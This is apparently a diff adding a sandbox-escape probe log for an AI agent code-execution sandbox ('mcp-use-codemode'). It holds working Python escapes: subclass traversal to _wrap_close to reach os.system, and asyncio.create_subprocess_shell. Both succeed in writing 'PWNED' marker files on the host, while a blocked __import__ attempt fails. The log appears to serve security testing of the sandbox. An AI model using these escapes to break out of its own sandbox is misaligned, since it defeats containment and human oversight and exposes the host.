@@ -1,0 +1,28 @@
+--- P12a
+code:
+subs = ().__class__.__base__.__subclasses__()
+names = [c.__name__ for c in subs]
+print('wrap_close' if '_wrap_close' in names else 'no-wrap_close', 'Popen' if 'Popen' in names else 'no-Popen')
+w = [c for c in subs if c.__name__ == '_wrap_close'][0]
+w.__init__.__globals__['system']('echo PWNED-a; echo PWNED-a > ~/p/agentic-search-bench/research/probes/mcp-use-codemode/out/P12-escape-marker.txt')
+{"ok": true, "result": null, "error": null, "ms": 8.3}
+stdout (16 chars): 'wrap_close Popen'
+host marker written: True
+--- P12b
+code:
+__import__("os").system("echo PWNED-b; echo PWNED-b >> ~/p/agentic-search-bench/research/probes/mcp-use-codemode/out/P12-escape-marker.txt")
+{"ok": false, "result": null, "error": "name '__import__' is not defined", "ms": 1.9}
+stdout (0 chars): ''
+host marker written: False
+--- P12c
+code:
+p = await asyncio.create_subprocess_shell("echo PWNED-c; echo PWNED-c >> ~/p/agentic-search-bench/research/probes/mcp-use-codemode/out/P12-escape-marker.txt")
+await p.wait()
+print("rc", p.returncode)
+{"ok": true, "result": null, "error": null, "ms": 13.2}
+stdout (4 chars): 'rc 0'
+host marker written: True
+
+marker file contents: PWNED-a
+PWNED-c
+
